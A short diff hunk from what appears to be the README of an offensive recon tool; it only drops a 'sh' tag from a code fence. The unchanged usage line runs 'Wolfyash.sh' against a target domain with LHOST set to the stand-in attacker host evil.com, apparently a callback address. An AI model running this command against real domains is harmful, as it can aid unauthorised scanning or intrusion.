@@ -82,7 +82,7 @@ dirsearch
    ```
 
 3. Run the script with the target domain:
-   ```sh
+   ```
   LHOST="http://evil.com" ./Wolfyash.sh example.com
 
    ```
